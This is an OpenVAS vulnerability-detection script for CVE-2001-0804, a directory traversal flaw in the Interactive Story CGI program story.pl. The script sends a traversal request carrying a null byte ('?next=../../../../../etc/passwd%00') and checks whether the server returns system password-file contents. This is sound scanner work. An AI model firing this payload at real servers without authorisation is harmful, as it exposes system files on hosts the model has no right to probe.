# OpenVAS Vulnerability Test
# $Id: story.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Interactive Story Directory Traversal Vulnerability
#
# Authors:
# Georges Dagousset <georges.dagousset@alert4web.com>
#
# Copyright:
# Copyright (C) 2001 Alert4Web.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to read arbitrary files on
the remote server by requesting :

GET /cgi-bin/story.pl?next=../../../file_to_read%00

An attacker may use this flaw to read arbitrary files on
this server.";

tag_solution = "Upgrade story.pl to the latest version (1.4 or later).";

if(description)
{
 script_id(10817);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3028);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2001-0804");
 name = "Interactive Story Directory Traversal Vulnerability";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);

 summary = "Checks for the presence of /cgi-bin/story.pl";
 script_summary(summary);

 script_category(ACT_GATHER_INFO);

 script_copyright("This script is Copyright (C) 2001 Alert4Web.com");
 family = "Web application abuses";
 script_family(family);

 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

function check(url)
{
 req = string(url, "?next=../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if(buf == NULL)exit(0);
 if(egrep(pattern:"^HTTP/.* 404 .*", string:buf))return(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
   {
    security_warning(port);
    exit(0);
   }
  
 if ( thorough_tests )
 {
  req = string(url, "?next=about");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  if (egrep(pattern:"This is version 1\.[0-3] of the story program", string:buf))
   {
    security_warning(port:port);
    exit(0);
   }
 }
}

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir ( cgi_dirs() )
{
check(url:string(dir, "/story.pl"));
#check(url:string(dir, "/story/story.pl"));
}
